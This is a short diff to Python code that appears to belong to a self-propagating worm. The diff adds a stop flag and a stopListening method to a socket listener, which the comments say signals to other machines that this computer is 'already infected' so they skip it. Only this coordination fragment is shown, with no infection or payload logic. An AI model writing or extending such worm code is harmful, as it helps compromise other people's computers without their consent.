@@ -9,6 +9,7 @@ class SocketListener(Thread):
 
 	def __init__(self):
 		Thread.__init__(self)
+		self.continueToListen = True
 		
 	def run(self):
 		#create an INET, STREAMing socket
@@ -18,13 +19,16 @@ class SocketListener(Thread):
 		#become a server socket, 5 is the number of maximum connections that we can have at the same time
 		serverSocket.listen(5)
 		
-		while True:
+		while self.continueToListen:
 			#we just received a new connection. This line will block until we receive a new connection.
 			conn, addr = serverSocket.accept()
 			
 			#we already infected the computer. Sending OK to the computer that made the connection to let him know that we infected the computer, so that he won't try to infect us
 			conn.sendall('OK'.encode('utf-8'))
 			conn.close()
+			
+	def	stopListening(self):
+		self.continueToListen = False
 
 #Step one: Open a socket, to let other computers know that this computer is infected.
 socketThread = SocketListener()
@@ -73,4 +77,5 @@ except:
 	pass
 finally:
 	from sys import exit
+	socketThread.stopListening()
 	exit(0) # Successful exit
